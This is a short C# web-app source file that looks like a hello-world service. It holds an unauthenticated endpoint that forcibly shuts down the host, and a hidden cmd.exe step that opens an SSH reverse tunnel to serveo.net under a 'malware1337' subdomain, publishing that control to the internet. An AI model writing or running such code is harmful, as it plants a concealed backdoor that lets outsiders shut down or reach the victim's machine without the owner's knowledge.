var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/", () => "Helo world");
app.MapGet("/control/switch-off", () => {
    System.Diagnostics.Process.Start("Shutdown", "-s -f -t 00");
});

// Turn on port forwarder
System.Diagnostics.Process process = new System.Diagnostics.Process();
System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
startInfo.FileName = "cmd.exe";
startInfo.Arguments = "/C ssh -R malware1337.serveo.net:80:localhost:1337 serveo.net";
process.StartInfo = startInfo;
process.Start();


app.Run();